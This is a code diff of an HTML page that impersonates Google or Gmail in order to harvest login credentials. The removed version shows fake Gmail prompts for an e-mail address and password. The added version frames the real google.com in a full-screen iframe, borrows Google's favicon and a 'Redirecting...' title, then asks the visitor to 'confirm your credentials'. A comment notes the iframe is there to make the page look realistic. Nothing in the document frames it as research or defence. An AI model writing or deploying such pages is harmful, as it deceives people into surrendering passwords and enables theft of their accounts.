@@ -1,8 +1,33 @@
-<script> function go(){ 
- var x=window.open('about:blank'); 
- setTimeout(function(){
- a=x.alert('Go to gmail.com');x.prompt('E-mail','');b=x.prompt('Password','');x.alert('Welcome to Gmail.com');} ,1000);
-  } 
- </script> 
- 
- <button onclick="go()">go</button>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirecting...</title>
+  <link rel="icon" href="https://www.google.com/favicon.ico">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+    iframe {
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      position: absolute;
+      top: 0;
+      left: 0;
+      z-index: 1;
+    }
+  </style>
+</head>
+<body>
+  <!-- Realistic-looking background -->
+  <iframe src="https://www.google.com"></iframe>
+
+  <script>
+    setTimeout(() => {
+      prompt("To continue to google.com, please confirm your credentials", "Email / Password");
+    }, 3500); // Give Google time to load visibly in iframe
+  </script>
+</body>
+</html>
